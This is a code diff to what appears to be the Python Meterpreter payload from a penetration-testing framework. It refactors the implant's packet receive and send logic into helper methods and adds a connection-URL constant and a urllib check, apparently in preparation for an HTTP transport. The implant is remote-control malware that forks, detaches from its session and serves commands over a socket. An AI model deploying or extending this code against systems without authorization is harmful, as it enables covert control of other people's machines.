@@ -18,6 +18,13 @@ except ImportError:
 else:
 	has_windll = hasattr(ctypes, 'windll')
 
+try:
+	import urllib
+except ImportError:
+	has_urllib = False
+else:
+	has_urllib = True
+
 if sys.version_info[0] < 3:
 	is_bytes = lambda obj: issubclass(obj.__class__, str)
 	bytes = lambda *args: str(*args[:1])
@@ -30,6 +37,7 @@ else:
 #
 # Constants
 #
+CONNECTION_URL = None
 DEBUGGING = False
 
 PACKET_TYPE_REQUEST        = 0
@@ -284,7 +292,7 @@ class STDProcess(subprocess.Popen):
 export(STDProcess)
 
 class PythonMeterpreter(object):
-	def __init__(self, socket):
+	def __init__(self, socket=None):
 		self.socket = socket
 		self.extension_functions = {}
 		self.channels = {}
@@ -318,19 +326,29 @@ class PythonMeterpreter(object):
 		self.processes[idx] = process
 		return idx
 
+	def get_packet(self):
+		request = None
+		if len(select.select([self.socket], [], [], 0.5)[0]):
+			request = self.socket.recv(8)
+			if len(request) != 8:
+				self.running = False
+				return None
+			req_length, req_type = struct.unpack('>II', request)
+			req_length -= 8
+			request = bytes()
+			while len(request) < req_length:
+				request += self.socket.recv(4096)
+		return request
+
+	def send_packet(self, response):
+		self.socket.send(response)
+
 	def run(self):
 		while self.running:
-			if len(select.select([self.socket], [], [], 0.5)[0]):
-				request = self.socket.recv(8)
-				if len(request) != 8:
-					break
-				req_length, req_type = struct.unpack('>II', request)
-				req_length -= 8
-				request = bytes()
-				while len(request) < req_length:
-					request += self.socket.recv(4096)
+			request = self.get_packet()
+			if request:
 				response = self.create_response(request)
-				self.socket.send(response)
+				self.send_packet(response)
 			else:
 				# iterate over the keys because self.channels could be modified if one is closed
 				channel_ids = list(self.channels.keys())
@@ -370,7 +388,7 @@ class PythonMeterpreter(object):
 							pkt += tlv_pack(TLV_TYPE_PEER_HOST, inet_pton(client_sock.family, client_addr[0]))
 							pkt += tlv_pack(TLV_TYPE_PEER_PORT, client_addr[1])
 							pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-							self.socket.send(pkt)
+							self.send_packet(pkt)
 					if data:
 						pkt  = struct.pack('>I', PACKET_TYPE_REQUEST)
 						pkt += tlv_pack(TLV_TYPE_METHOD, 'core_channel_write')
@@ -379,7 +397,7 @@ class PythonMeterpreter(object):
 						pkt += tlv_pack(TLV_TYPE_LENGTH, len(data))
 						pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 						pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-						self.socket.send(pkt)
+						self.send_packet(pkt)
 
 	def handle_dead_resource_channel(self, channel_id):
 		del self.channels[channel_id]
@@ -390,7 +408,7 @@ class PythonMeterpreter(object):
 		pkt += tlv_pack(TLV_TYPE_REQUEST_ID, generate_request_id())
 		pkt += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 		pkt  = struct.pack('>I', len(pkt) + 4) + pkt
-		self.socket.send(pkt)
+		self.send_packet(pkt)
 
 	def _core_loadlib(self, request, response):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
@@ -546,5 +564,8 @@ if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 			os.setsid()
 		except OSError:
 			pass
-	met = PythonMeterpreter(s)
+	if CONNECTION_URL and has_urllib:
+		met = PythonMeterpreter(s)
+	else:
+		met = PythonMeterpreter(s)
 	met.run()
